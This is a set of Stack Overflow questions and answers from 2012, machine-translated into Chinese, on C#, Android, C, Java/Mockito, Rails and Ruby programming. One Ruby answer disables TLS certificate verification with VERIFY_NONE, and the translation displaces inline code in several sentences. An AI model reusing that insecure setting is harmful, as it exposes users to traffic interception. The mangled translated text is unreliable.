# wcf - 我应该创建多少个 DTO？

> ID：13061547
> 
> 赞同：1
> 
> 时间：2012-10-25T04:26:14.463
> 
> 标签：wcf, c#-4.0, dto

我得到了一些返回 DTO 的服务，现在我可以为不同的方法重用相同的 DTO。

假设我有以下界面：

```
List<ProductDTO> GetProductsByReseller(int reseller)
List<ProductDTO> GetProductsByManufacturer(int Manufacturer)
List<ProductDTO> GetProductsByCategory(int Category) 
```

我认为对它们使用相同的 DTO 是绝对有效的，因为它们都具有相同的字段。

```
public class ProductDTO
{
    public int Id { get; set; }
    public string ProductName { get; set; }
    public int Reseller { get; set; }
    public int Manufacturer { get; set; }
    public int Category { get; set; }
} 
```

现在我有一些其他的方法，例如：

```
List<ProductDTO> GetProductsWithAdminInfoByCategory(int Category) 
```

对于这种方法，我必须使用一些附加字段来扩展 DTO。

```
 #region only for admin
     public int KnownDefects { get; set; }
     public DateTime InStockSince { get; set; }   
     #endregion //only for admin 
```

可以重用现有的 DTO 并简单地扩展它吗？还是我应该创建一个新的 DTO，因为该方法中永远不会使用某些字段？

我的想法：如果只有 1 或 2 个字段是新的（在其他情况下从未使用过），也许没关系，因为我不必创建重复的 DTO 并且维护 2 个 DTO 而不是 1 个的权衡是可以的。如果我从 ProductDTO 派生 AdminProductDTO 可能会很好，但我不知道继承是否对 DTO 有效。

那么我错了吗？从什么时候开始创建一个新的 DTO，什么是一个好的阈值（nbr of changes）？

**更新：** 如果我在 WCF 中公开一个会公开 ProductDTO 的服务，如果它们未设置或为空，它是否必须传输*KnownDefects*和*InStockSince属性？*还是 WCF 足够聪明，根本不需要传输未定义/空属性？（在这种情况下，我不介意只有一个具有 2 个不总是使用的属性的 DTO。）

**另一个更新：** 如果我从 ProductDTO 继承 ProductAdminDTO，我仍然可以用它调用以下服务（只接受 ProductDTO）吗？

```
bool SaveProduct(ProductDTO) 
```

好吧，我想我可以自己尝试一下，稍后会更新:)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T04:33:07.507

好吧，您似乎陷入了经典的继承与组合问题。

想想是否有ProductionWithAdminInfo“ISA”产品？我认为它不满足 ISA 关系。额外的管理员信息只是产品的另一个属性。

所以在这里作曲似乎是不错的选择。ProductWithAdminInfoDTO 包含 ProductDTO 和 AdminInfoDTo。

# asp.net - 使用是否需要打开 sqlconnection

> ID：13061548
> 
> 赞同：-3
> 
> 时间：2012-10-25T04:26:47.320
> 
> 标签：asp.net, vb.net

```
//do i need to do this?
using (SqlConnection connection = new SqlConnection(connectionString))
    {
        connection.Open();
        ....
    } //connection disposed 
```

还是简单地使用关闭来打开和关闭我的连接？

```
using (SqlConnection connection = new SqlConnection(connectionString))
    {// connection opened
        ....
    } //connection disposed 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T04:28:50.757

是的，如果你想使用它，你必须打开它。

构造[函数](http://msdn.microsoft.com/en-us/library/d7469at0.aspx)只是创建一个新对象并根据连接字符串填充一些属性（如果连接字符串未指定它们，则为默认值）。它[`using`](http://msdn.microsoft.com/en-us/library/htd05whh%28v=vs.80%29.aspx)本身不会对对象做任何额外的事情，它只是在该块的持续时间内创建连接时启动一个新块。

我也会[关闭](http://msdn.microsoft.com/en-us/library/system.data.sqlclient.sqlconnection.close.aspx)（在明确提交任何未完成的事务之后，因为我认为 close 会对这些事务进行回滚）。

而且我也会[处理](http://msdn.microsoft.com/en-us/library/3cc9y48w.aspx)它，这样就不必等待垃圾收集器完成它（某些资源被保留直到处理）。

# python - python irc bot命令

> ID：13061552
> 
> 赞同：0
> 
> 时间：2012-10-25T04:26:59.663
> 
> 标签：python, if-statement, urllib, irc

当用户输入!metar（机场代码）时，下面的脚本将显示metar信息。但是，我有两个问题：

1) 用户输入 !metar 时没有代码如何处理。我想显示：“示例：！metar ksfo”。下面的 if 语句不这样做。

2）当用户输入错误代码时如何处理。urllib 将打开 .txt 文件，但会显示来自 html 链接的错误。我尝试了类似的 if 语句，但这也不起作用。

```
 import socket
from urllib import urlopen

def metar(airport):
    airport = airport.upper()
    for metar in urlopen('http://weather.noaa.gov/pub/data/observations/metar/stations/%s.TXT' %airport):
        metar = metar.decode("utf-8")
        if "%s" %airport in metar:
            irc.send('PRIVMSG '+ channel +' :%s' %metar)
        #else: 
        #   irc.send('PRIVMSG '+ channel +' :Incorrect airport code.')

network = 'irc.freenode.net'
port = 6667
nick = 'savvis_bot'
channel = '#savvis_bot'

irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "Connecting to server...", network
irc.connect((network, port))
print irc.recv(4096)
irc.send("USER "+ nick +" "+ nick +" "+ nick +" :Savvis\n")
irc.send("NICK " + nick + "\n")
irc.send("JOIN " + channel + "\n")

while True:
    data = irc.recv(4096)
    print data
    if data.find('PING') != -1:
        irc.send('PING ' + data.split() [1] + '\r\n')
    if data.find(':!metar') != -1:
        airport_command = data.split(':!metar')
        airport = airport_command[1].strip()
        if airport == '':
            irc.send('PRIVMSG '+ channel +' :Example: !metar KSFO')
        else:
            metar(airport) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T04:38:02.150

1）尝试更改`if`/`else`条件：

```
if "%s" %airport in metar: 
```

至

```
if airport in metar: 
```

2) 包装`urlopen`成`try`/`except`子句并发送异常错误，可能区分连接超时和类似的东西与不正确的机场代码。

然后，我不确定你之前是否问过关于这个机器人的问题，但我想我今晚看到了一个类似的问题。

IRC 是基于线路的协议。不保证做得到`irc.recv(4096)`你想要的。它可以是行的中间，可以是行的结尾，可以是一行的结尾和另一行的开头，等等。您需要使用`readline()`基于 - 的方法，而不是字节缓冲区。

# android - Android布局混乱

> ID：13061556
> 
> 赞同：1
> 
> 时间：2012-10-25T04:27:55.623
> 
> 标签：android

这是我的捕获图片：
![在此处输入图像描述](../Images/e98f4a9ae6bab135921efe6adc062c76.png)

这是我的代码：

```
<RelativeLayout
    android:id="@+id/wrapper"
    android:layout_width="fill_parent"
    android:layout_height="wrap_content" 
    android:gravity="left">

    <TextView
        android:id="@+id/timeIn"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"  
        android:layout_toRightOf="@+id/messageIn"          
        android:layout_gravity="center"
        android:layout_marginTop="15dip"
        android:text="23:23"/>

    <TextView
        android:id="@+id/messageIn"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"       
        android:layout_gravity="center"
        android:layout_margin="5dip"
        android:background="@drawable/bubble_yellow"
        android:paddingLeft="10dip"
        android:text="HIHIHIHIHIHI" />

</RelativeLayout> 
```

但是，如果文本“HIHIHIHIHIHI”更改为“HIHIHIHIHIHIHIHIHIHIHIHIHIHIHIHIHI”：时间将丢失，气泡将填充父项
![在此处输入图像描述](../Images/714ce344311b5746682629f8e3ddb3d8.png)

即使文本是多行的，我该怎么做才能使时间仍然在气泡的右侧？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T04:45:03.457

尝试这个

```
<RelativeLayout
    android:id="@+id/wrapper"
    android:layout_width="fill_parent"
    android:layout_height="wrap_content" 
    android:gravity="left">

    <TextView
        android:id="@+id/timeIn"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"           
        android:layout_gravity="center"
        android:layout_marginTop="15dip"
        android:layout_alignParentRight="true"
        android:text="23:23"/>

    <TextView
        android:id="@+id/messageIn"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"       
        android:layout_gravity="center"
        android:layout_margin="5dip"
        android:background="@drawable/bubble_yellow"
        android:layout_toLeftOf="@+id/timeIn" 
        android:layout_alignParentLeft="true" 
        android:paddingLeft="10dip"
        android:text="HIHIHIHIHIHI" />

</RelativeLayout> 
```

也适用于小文本（根据消息调整 messageIn 的宽度）和出现在消息右侧的时间（不是右对齐）

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
android:id="@+id/wrapper"
android:layout_width="wrap_content"
android:layout_height="wrap_content"
android:weightSum="1.0" >

<LinearLayout
    android:id="@+id/lin_lay1"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_weight="1.0" >

    <TextView
        android:id="@+id/messageIn"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_gravity="center"
        android:layout_margin="5dip"
        android:background="@drawable/bubble_yellow"
        android:paddingLeft="10dip"
        android:text="HIHIHI" />
</LinearLayout>

<LinearLayout
    android:id="@+id/lin_lay2"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_weight="0.1" >

    <TextView
        android:id="@+id/timeIn"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_gravity="center"
        android:layout_marginTop="15dip"
        android:padding="5dp"
        android:text="23:23" />
</LinearLayout>

</LinearLayout> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-25T04:41:42.597

在你的文本视图中使用 android:maxwidth。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-25T04:48:15.393

一个解决方案是设置“messageIn”TextView 的 android:maxWidth="" 属性。在运行时 - 获取设备屏幕的宽度，“timeIn”TextView 的宽度，并使用 TextView 的 setMaxWidth(int maxpixels) 方法设置差异（屏幕宽度 - timeIn 宽度）。

[在此处查看如何获取屏幕尺寸](https://stackoverflow.com/questions/1016896/android-how-to-get-screen-dimensions)

[在此处查看如何获取 GUI 对象大小](https://stackoverflow.com/questions/4649438/how-to-get-the-dimensions-of-a-drawable-in-an-imageview)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-25T04:37:24.143

使用 layout_weight 它只会占用分配的空间，并且不会覆盖时间 textview。

```
<LinearLayout
    android:id="@+id/wrapper"
    android:layout_width="fill_parent"
    android:layout_height="wrap_content" 
    android:orientation="horizontal"
    android:weightsum="1">

    <TextView
        android:id="@+id/timeIn"
        android:layout_width="0dip"
        android:layout_height="wrap_content"  
        android:layout_weight="0.7"
        android:layout_gravity="center"
        android:layout_marginTop="15dip"
        android:text="23:23"/>

    <TextView
        android:id="@+id/messageIn"
        android:layout_width="0dip"
        android:layout_height="wrap_content"       
        android:layout_weight="0.3"
        android:layout_margin="5dip"
        android:background="@drawable/bubble_yellow"
        android:paddingLeft="10dip"
        android:text="HIHIHIHIHIHI" />

</LinearLayout> 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-10-25T04:47:37.143

你可以通过两种方式做到这一点： -

1.  您可以使用线性布局并设置其 android:orientation="horizo​​ntal" 并且您需要修复 Textview 的 layout_width。

2.  在代码中将时间与 TextView 连接起来。

    ```
    <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@+id/wrapper"
    android:layout_width="fill_parent"
    android:layout_height="wrap_content" 
    android:orientation="horizontal">
     <TextView
     android:id="@+id/messageIn"
     android:layout_width="200dp"
     android:layout_height="wrap_content"      
     android:text="HIHIHIHIdsfffffffffffffffffffffffffffffffffffffffffffffHIHI" />
    <TextView
     android:id="@+id/timeIn"
     android:layout_width="wrap_content"
     android:layout_height="wrap_content"  
     android:layout_marginTop="5dp"
     android:text="23:23"/>

     </LinearLayout> 
    ```

# java - 将数据从 My SQL 传递到 ANDROID

> ID：13061564
> 
> 赞同：-1
> 
> 时间：2012-10-25T04:29:48.467
> 
> 标签：java, php, android, mysql

我有一个要求，我想通过 PHP 在 Android TextView 中显示来自 MySQL 的数据。这就是界面的样子

```
Casual Leave
  Leave Taken:
  Leave Remaining:

Privilege Leave
  Leave Taken:
  Leave Remaining: 
```

我是android编程的初学者。我知道如何通过PHP建立连接....我需要帮助来来回传递数据并显示它。感谢任何帮助。提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T04:41:54.777

更好的方法是在 中创建一个 Web 服务`php`，并`web service`通过它使用它`android`，然后您的客户端 ( `Android application`) 向该服务发送`HTTP`请求`REST`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-25T04:50:37.563

您可以使用 JSon 将数据从 android 解析到 mysql Db 和 mysql db 到 android。这是处理 mysql db 到 android 之间的数据传输的简单快捷的方法，反之亦然。为此，您需要 php 作为接口。按照以下链接[mysqlphpandroid](http://www.coderzheaven.com/2012/09/25/table-values-mysql-database-show-android-tables/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-25T04:46:00.990

您必须执行以下操作：

*   从服务器请求数据。这是[一个链接](https://stackoverflow.com/questions/9553156/android-getting-data-from-server)！
*   解析数据（如果它的格式是 JSON 或 XML）
*   以 html 格式显示在 textview 上。这是[一个链接](https://stackoverflow.com/questions/2116162/how-to-display-html-in-textview)！

# c++ - C ++中的动态函数参数，可能吗？

> ID：13061565
> 
> 赞同：3
> 
> 时间：2012-10-25T04:29:51.273
> 
> 标签：c++, function

我对 C++ 并不陌生，我对变量参数传递有一个疑问。正如我在下面的示例代码中提到的（此代码根本不起作用，只是为了让其他人理解我的问题，我将它这样框定），我有两个函数 func，带有 1 个参数和 2 个参数（参数重载）。我正在从 main 调用 func，在此之前我正在检查是否需要调用 2 个参数或 1 个参数。这是问题所在，因为我知道我可以在各自的 if elseif 语句中调用两个函数，但我很想知道我是否可以只使用一个函数来管理。（在下面的代码中，我传递的是字符串而不是 int，正如我之前提到的，这只是为了让其他人理解。

```
#include<iostream.h>
#include <string>

void func(int, int);
void func(int);

void main()
{
   int a, b,in;

   cout << "Enter the 2 for 2 arg, 1 for 1 arg\n";
   cin << in;

   if ( in == 2)
   { 
      string pass = "a,b";
   }
   elseif ( in == 1)
   {
      string pass = "a";
   }
   else
   {
      return 0;
   }

   func(pass);

   cout<<"In main\n"<<endl;
}

void func(int iNum1)
{
   cout<<"In func1 "<<iNum1<<endl;
}

void func(int iNum1, int iNum2)
{
   cout<<"In func2 "<<iNum1<<" "<<iNum2<<endl;
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-25T04:59:22.643

您可以使用 Ronald 解释的 stdarg 方法。或者你可以使用一个接受参数向量的函数。首先将参数推送到向量，然后调用以下函数：

```
func(const vector<int>& argv) {
  for (vector<int>::const_iterator iter = argv.begin(); iter != argv.end(); ++iter) {
    // Get the arguments
  }
  // Do what you want ...
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-25T04:41:19.537

我相信您可能有兴趣查看 stdarg 库。示例用法如下，

```
#include <cstdarg>
#include <iostream>

using namespace::std;

void func(int, ...);

int main(void) {
  func(1, 10);
  func(2, 20, 30);
  return 0;
}

void func(int num_args, ...) {
  va_list ap;

  va_start(ap,num_args);
  for(size_t loop=0;loop<num_args;++loop) {
    if(loop>0) cout << " ";
    cout << va_arg(ap,int);
  }

  va_end(ap);

  cout << endl;
} 
```

# jvm - 无法通过 webstart 创建 java 虚拟机

> ID：13061566
> 
> 赞同：0
> 
> 时间：2012-10-25T04:30:11.447
> 
> 标签：jvm, java

我有一个使用 Java Web Start 启动的应用程序。以前我通过 IE 64bit 启动它，它运行良好，直到 Java 决定更新到 v7。然后它变成了梨形。

此应用程序不适用于 Java 7，因此我卸载并返回 Java 6_37，但现在我无法从 64 位浏览器启动它。它总是显示错误“Java 虚拟机启动器 - 无法创建 Java 虚拟机”

IE 的 32 位版本很好，Chrome 也很好，但 64 位版本不行。

我已经挖掘了注册表以修改或消除对 jre7 的任何引用并使用了 Revo，但这仅检测到我拥有的 JRE6 版本。

任何有关如何让我的 64 位 IE 工作的帮助将不胜感激。

机器正在运行 Windows 7、64 位。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-08-07T07:25:11.730

不再是问题，从记忆来看，这是因为我有 IE 指向的 32 位 jvm 的旧版本。一旦我完全卸载了 JAVA 并重新安装它就得到了正确的 64 位版本。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T04:39:05.787

如果用户正在运行 64 位浏览器，则应下载 64 位 Java 软件。如需下载 64 位 Java，请单击[64 位手动下载](http://www.java.com/en/download/manual.jsp)

# c - C中的帕斯卡三角形

> ID：13061568
> 
> 赞同：1
> 
> 时间：2012-10-25T04:30:21.470
> 
> 标签：c

我主要是一名 Python/MIT Scheme 程序员，但我想学习 C，因为我将在下学期学习 C，我想做好准备。我会说我对python和scheme非常好，所以我不是一般编程的新手。这是我的一个爱好:)。

所以我尝试编写一个 C 程序来计算帕斯卡三角形，但它给了我一个不正确的输出。我编译没有错误，这是我的代码：

```
/*
  This code is just to see exactly how much faster C is than python                                                                          
  at doing numerically stuff. It should calculate the nth row of                                                                             
  pascals triangle.                                                                                                                          
  The way you use it is by calling the executable with the row                                                                               
  you wish to compute as the only argument. For example if you                                                                               
  are on an *nix system:                                                                                                                     
  ./pascal 6                                                                                                                                 

  Or in a windows command prompt:                                                                                                            
  pascal.exe 6                                                                                                                               
*/

#include <stdlib.h>
#include <stdio.h>
#include <assert.h>

/*
  I decided to use a struct here because I thought it was ugly                                                                               
  to have to pass around the length of my arrays in function                                                                                 
  calls.                                                                                             
*/
typedef struct{
  int length;
  unsigned long int* vals;
} CoolArray;

//initArray allocates memory for the CoolArray.                                                                                              
void initArray(CoolArray* array, int length);

//destroyArray frees allocated memory in the struct.                                                                                         
void destroyArray(CoolArray* array);

//printArray prints the contents of the array.                                                                                               
void printArray(CoolArray* array);

//pascal computes the nth row of pascal's                                                                                                    
//triangle, with n being array->length,                                                                                                      
//and stores the values in the array.                                                                                                        
void pascal(CoolArray* array);

//setArray takes two CoolArrays of the same length                                                                                           
//and sets the values in the first to the values                                                                                             
//in the second.                                                                                                                             
void setArray(CoolArray* array1, CoolArray* array2);

int main(int argc, char** argv){
  int length = atoi(argv[1]);
  CoolArray array1;
  initArray(&array1, length);
  printf("Calculating the %dth row of pascals triangle...\n", length);
  pascal(&array1);
  printArray(&array1);
  destroyArray(&array1);
  return 0;
}

void initArray(CoolArray* array, int length){
  assert(length>=1); //don't make arrays with a length <=0!!!                                                                                
  array->length = length;
  array->vals = (unsigned long int*) calloc(length, sizeof(unsigned long int));
  return;
}

void destroyArray(CoolArray* array){
  free(array->vals);
  return;
}

void pascal(CoolArray* array){
  assert(array->length >= 1);//making sure the length wasn't fiddled with...                                                                 
  if(array->length == 1){
    array->vals[0] = 1;
    return;
  }
  int row;
  int index;
  array->vals[0]=1; //if we aren't looking for the first row                                                                                 
  array->vals[1]=1;//then i'll start with the second row                                                                                     
  CoolArray current;
  initArray(&current, array->length);
  for(row = 2; row < array->length; ++row){
    current.vals[0]=1;
    for(index = 1; index < row; ++index){
      current.vals[index]=array->vals[index]+array->vals[index-1];
    }
    current.vals[row]=1;
    printArray(&current);
    setArray(array, &current);
  }
  destroyArray(&current);
  return;
}

void setArray(CoolArray* array1, CoolArray* array2){
  assert(array1->length==array2->length);//making sure they are the same length                                                              
  int i=0;
  for(; i < array2->length; ++i){
    array1->vals[i]=array2->vals[i];
  }
  return;
}

void printArray(CoolArray* array){
  int i=0;
  printf("[");
  for(; i < array->length; ++i){
    if (i = array->length - 1) printf("%d]\n", array->vals[i]);
    else printf("%d, ", array->vals[i]);
  }
  return;
} 
```

谁能看到我哪里出错了？它的输出现在看起来像这样：

./帕斯卡 6

计算帕斯卡三角形的第 6 行...

[1]

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-25T04:33:45.913

您的错误在这一行：

```
if(array->length = 1){ 
```

由于单个等号，您*将*1分配给。`array->length`用于`==`相等性测试，并在编译器中打开警告 ( `-Wall`)。

（您在该行有一个类似的错误`if (i = array->length - 1)`，导致您看到的输出格式不正确）。

# c - char 数组正在使我的堆栈结构崩溃。我声明有什么问题吗？

> ID：13061572
> 
> 赞同：0
> 
> 时间：2012-10-25T04:31:08.743
> 
> 标签：c, crash, stack, arrays

我试图了解堆栈结构的工作原理，但由于某种原因，每当我尝试从中打印时`charElements`，我的程序崩溃了，我不知道为什么。这是我不断收到的错误：（它在断点处）`while (i-- && *p)`。但我不知道我如何宣布一切有什么问题。有什么想法吗？

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <math.h>

typedef struct Stack
{
    int capacity;       // max # of elements the stack can hold
    int size;           // current size of the stack
    int *elements;      // the array of elements
    char *charElements; // the array of chars
}Stack;

Stack * createStack(int maxElements)
{        
    // Create a Stack         
    Stack *S;        
    S = (Stack *)malloc(sizeof(Stack));        
    // Initialise its properties         
    S->charElements = (char *)malloc(sizeof(int)*maxElements);
    S->elements = (int *)malloc(sizeof(int)*maxElements);   
    S->size = 0;        
    S->capacity = maxElements;        
    /* Return the pointer */        
    return S;
}

int main()
{

    Stack *S = createStack(60);     

    char registerNames[63] = {"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"};

    // if the user input a a string

    S->elements[S->size++] = 1;
    S->elements[S->size++] = 2;
    S->elements[S->size++] = 3;

    S->charElements[S->size++] = *registerNames;

    printf("%d \n", S->elements[0]); 
    printf("%d \n", S->elements[1]); 
    printf("%d \n", S->elements[2]);  
    printf("%d \n", S->size); 
    printf("%s \n", S->charElements[3]);

    system("pause");

    return 0;
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T04:43:13.327

```
printf("%s \n", S->charElements[3]); 
```

`S->charElements[3]`是一个*`char`*，不是一个`char *`。因此，当您尝试将其打印出来时，您将取消引用错误的内存地址并崩溃。

用于`printf("%c \n",S->charElements[3]);`打印出`char`那个位置。

另外，请注意

```
S->charElements[S->size++] = *registerNames; 
```

只会从 复制一个字符`registerNames`，因为它会将其视为`char`取消引用。如果您想复制字符串，`strcpy`请改用（但请确保您有足够的空间！！）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T04:46:25.693

问题出在这个语句中

```
printf("%s \n", S->charElements[3]); 
```

将其更改为

```
printf("%c \n", S->charElements[3]); 
```

你的程序不会崩溃。

带有 %s 的 printf 需要一个以空字符结尾的字符串。您没有带有 S->charElements[3] 的空终止字符串。这只是一个字符。

# flexslider - Flexslider 在幻灯片上方和下方添加空白区域

> ID：13061577
> 
> 赞同：1
> 
> 时间：2012-10-25T04:31:50.557
> 
> 标签：flexslider

谁能告诉我为什么会这样？我是新手，但我在 flexslider.css 中看不到任何可以添加此空间的内容。谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T02:01:28.907

我遇到过同样的问题。似乎主要是由于从 FlexSlider 站点的示例 html 复制时的空白。

该示例的格式如下：

```
<ul class="slides">
    <li>
        <img src="slide1.jpg" />
    </li>
</ul> 
```

如果你像这样重新格式化它......

```
<ul class="slides">
    <li><img src="slide1.jpg" /></li>
</ul> 
```

...大部分不需要的空间消失了。

默认情况下，.flexslider div 上还有一个 4px 边框，并且我还有一行不需要的空白，我删除了它，其上边距等于我的默认行高：

```
.flexslider {
    border: 0 !important;
    margin-top: -1.4em !important;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-05T17:23:23.857

如果您的滑块包含图像元素，您可能需要将图像设置为`display:block`. 另外，如果你能提供一个例子，它会更容易诊断。

# java - 在 Mockito 中重用模拟行为/最佳实践？

> ID：13061581
> 
> 赞同：5
> 
> 时间：2012-10-25T04:32:32.087
> 
> 标签：java, unit-testing, mockito

我将以我非常年轻并且没有太多测试经验并且以前从未使用过模拟框架的背景作为开场白。

我正在为涉及许多不同 Web 服务的代码编写单元测试，我对此进行了嘲笑。我的许多测试都验证了调用的结果，其中我的所有服务调用都成功，但对 ServiceX 的调用除外。我的第一直觉是为 @Before 块中的所有模拟设置快乐路径行为，然后为每个测试修改模拟行为。

```
@Before
public void init(){
    when(serviceA.doSomething()).thenReturn(true);
    when(serviceB.doSomething()).thenReturn(true);
    when(serviceC.doSomething()).thenReturn(true);
    when(serviceD.doSomething()).thenReturn(true);
    when(serviceE.doSomething()).thenReturn(true);
}

@Test
public void testDoBusinessSuccess(){
    String result = businessLogic.doBusiness();
    assertThat(result, is("success"));
}

@Test
public void testDoBusinessFailureWhenServiceAFails(){
    when(serviceA.doSomething()).thenReturn(false);

    String result = businessLogic.doBusiness();
    assertThat(result, is("service A is down!"));
}

@Test
public void testDoBusinessFailureWhenServiceBFails(){
    when(serviceB.doSomething()).thenReturn(false);

... 
```

这使得每个测试用例都简洁，并且很容易看到正在测试的内容，因为我只指定了偏离规范的行为。

但我怀疑这不是 Mockito 希望我设置模拟行为的方式，因为当我尝试验证 ServiceB 中的失败意味着 ServiceC 永远不会被命中时，我意识到我`when(serviceC.doSomething())`在 @Before 中的调用算作对 serviceC 的调用. 也就是说，我`verifyZeroInteractions(serviceC)`总是失败，因为我调用了`when(serviceC.doSomething()).thenReturn(true)`，即使测试用例从未触及 serviceC 。

那么最佳实践是什么？即使我会在所有地方重复几乎相同的 5 行，我是否最好在每次测试中明确设置每个模拟的行为？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T04:42:21.020

```
when(serviceC.doSomething()) in the @Before counted as invocations on serviceC 
```

我怀疑该`when`构造是否被视为调用，因为这只是存根。
您能否仔细检查您的代码以查看是否`serviceC.doSomething`从您的内部调用`@Test`

关于最佳实践，我认为您应该只将所有测试用例常见的存根行为转移到`@Before`

除了您的代码看起来的方式之外，我认为您可以尝试重构为`Chain of Responsibility`模式，**[这](https://stackoverflow.com/questions/8944976/how-to-implement-chain-of-responsibility-in-a-testable-fashion)**应该有助于您编写测试代码。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T04:39:15.470

这并不特定于模拟，但只有每个测试共有的代码才应该放在 @Before 中，因为它会在每个 junit 测试之前执行。

因此，如果您想要特定于测试的行为，那么所有那些嘲笑的东西都应该在这些测试中。

如果您有多个测试共有的行为，您可以将其提取到一个方法中，该方法仅由需要该行为的测试调用。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-25T16:36:34.063

正在计数的调用`verify`是测试方法本身中的调用。将 each 方法中的调用更改为如下所示。

```
doReturn(false).when(serviceA).doSomething(); 
```

这将与您正在做的事情在被存根方面产生相同的效果；`doSomething`但出于验证的目的，它不会被视为调用。

# ruby-on-rails - 在没有自动加载的情况下将随机代码放在轨道上并在控制器中需要它？

> ID：13061582
> 
> 赞同：2
> 
> 时间：2012-10-25T04:32:38.390
> 
> 标签：ruby-on-rails

有一个包含专有类的文件夹（例如：propcode），其中包含一些类（例如：propclass.rb），我应该把那个文件夹放在哪里以及如何在控制器内部使用？这些类没有模块，我无法更改它们，因为会破坏其他应用程序。

谢谢，我是 ruby​​ 的新手，现在已经尝试了近一个小时，但失败了。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T04:43:49.927

放置此类文件的最佳位置是`lib/propcode`. 如果您只打算使用控制器中的代码，那么您应该在顶部`app/controllers/application_controller.rb`使用以下代码：

```
# Require propcode files
Dir.glob(Rails.root.join('lib/propcode/**/*.rb')).each do |f|
  require f
end 
```

然后，您将能够在控制器中使用这些类，并且不会为 Rake 任务或后台作业加载它们。

# ruby - 通过 Ruby 实现 Google Maps Geolocation API

> ID：13061588
> 
> 赞同：3
> 
> 时间：2012-10-25T04:33:14.427
> 
> 标签：ruby, google-maps, geolocation

我一直在尝试使用新的 Geolocation API。我也有一个 API 密钥。但不知何故，输出显示为“未找到”。有人可以告诉我错误在哪里吗？

> ```
> require 'net/http'
> require 'uri'
> require 'json'
> require 'httparty'
> 
> lac=50039
> mnc=86
> cid=15471
> mcc=404
> rssi=-69
> 
>     cell_towers = [{:cellId => cid,
>   :locationAreaCode => lac,
>   :mobileCountryCode => mcc,
>   :mobileNetworkCode => mnc,
>   :signalStrength => rssi }] 
> 
>     param = {:cellTowers => cell_towers}
>    puts param.to_json
>    #puts "https://www.googleapis.com/maps/api/geolocation/v1/geolocate?key=#{api_key}"
> 
>       response = HTTParty.post("https://www.googleapis.com/maps/api/geolocation/v1/geolocate?key=my_key",
>       :body => param.to_json, 
>       :header => {"Content-Type" => "application/json"})
>       puts response
>       temp= response.body
>       puts temp 
> ```

上面代码给出的输出是：

> {"cellTowers":[{"cellId":15471,"locationAreaCode":50039,"mobileCountryCode":404,"mobileNetworkCode":86,"signalStrength":-69}]} 未找到未找到

Google Maps Geolocation API 文档的链接： [https ://developers.google.com/maps/documentation/business/geolocation/](https://developers.google.com/maps/documentation/business/geolocation/)

当我手动创建一个 json 对象并使用“curl”命令在命令提示符下运行它时，输出正确。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-09T23:24:52.403

所以我在这个完全相同的问题上苦苦挣扎，但是在.Net中使用了一个简单的http帖子......

似乎有关 URL 的 API 文档是错误的。

而不是：[https ://www.googleapis.com/maps/api/geolocation/v1/geolocate?key=API_key](https://www.googleapis.com/maps/api/geolocation/v1/geolocate?key=API_key)

它实际上是：[https ://www.googleapis.com/geolocation/v1/geolocate?key=API_key](https://www.googleapis.com/geolocation/v1/geolocate?key=API_key)

希望这可以帮助！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-23T09:07:02.063

在您的帮助下，我可以解决问题。谢谢！想我会分享代码。它可能会有所帮助。

```
cell_towers = [{:cellId => cid,
                :locationAreaCode => lac,
                :mobileCountryCode => mcc,
                :mobileNetworkCode => mnc,
                :signalStrength => rssi }] 

param = {:cellTowers => cell_towers}
uri = URI.parse('https://www.googleapis.com/geolocation/v1/geolocate?key=your_key')

http = Net::HTTP.new(uri.host, uri.port)
http.use_ssl = true
http.verify_mode = OpenSSL::SSL::VERIFY_NONE
request = Net::HTTP::Post.new(uri.request_uri)
request.body=param.to_json
request["Content-Type"]="application/json"
response = http.request(request)
result=response.body
res=JSON.parse(result)
lat=res["location"]["lat"]
long=res["location"]["lng"] 
```

# jsp - 如何使用 Servlets、Jsp 播放视频文件？

> ID：13061589
> 
> 赞同：0
> 
> 时间：2012-10-25T04:33:17.960
> 
> 标签：jsp, servlets

我是 Java 应用程序开发的新手。

